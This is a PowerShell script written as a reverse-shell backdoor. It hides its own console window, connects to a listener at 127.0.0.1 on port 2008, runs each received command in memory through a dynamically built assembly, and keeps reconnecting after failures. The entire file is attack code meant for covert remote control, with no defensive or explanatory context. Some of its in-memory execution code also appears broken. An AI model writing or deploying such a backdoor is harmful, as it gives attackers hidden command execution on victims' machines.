# Function to hide the PowerShell window
function Hide-Window {
    $code = @"
using System;
using System.Runtime.InteropServices;

public class Window {
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    private static extern int ShowWindow(IntPtr hWnd, uint nCmdShow);

    private const uint SW_HIDE = 0;
    private const uint SW_SHOW = 5;

    public static void Hide() {
        IntPtr hWnd = GetForegroundWindow();
        ShowWindow(hWnd, SW_HIDE);
    }

    public static void Show() {
        IntPtr hWnd = GetForegroundWindow();
        ShowWindow(hWnd, SW_SHOW);
    }
}
"@
    Add-Type -TypeDefinition $code -Language CSharp
    [Window]::Hide()
}

function Invoke-InMemoryScript {
    param (
        [string]$code
    )
    $assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("InMemoryAssembly")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule("InMemoryModule")
    $type = $module.DefineType("InMemoryType", "Public, Class")
    $method = $type.DefineMethod("Execute", "Static, Public", [void], @([string]))
    $generator = $method.GetILGenerator()
    $generator.Emit(OpCodes.Ldstr, $code)
    $generator.Emit(OpCodes.Call, [System.Management.Automation.ScriptBlock]::Create($code).GetType().GetMethod("Invoke", [System.Reflection.BindingFlags] "NonPublic, Instance"))
    $generator.Emit(OpCodes.Ret)
    $type.CreateType().GetMethod("Execute").Invoke($null, @($code))
}

function Connect-Back {
    try {
        $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 2008)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Read and execute commands
        while ($client.Connected) {
            $data = $reader.ReadLine()
            if ($data) {
                try {
                    Invoke-InMemoryScript -code $data
                } catch {
                    $output = $_.Exception.Message
                    $writer.WriteLine($output)
                    $writer.Flush()
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 5
        Connect-Back
    } finally {
        if ($client.Connected) {
            $writer.Close()
            $reader.Close()
            $client.Close()
        }
    }
}

# Main execution
Hide-Window
Connect-Back
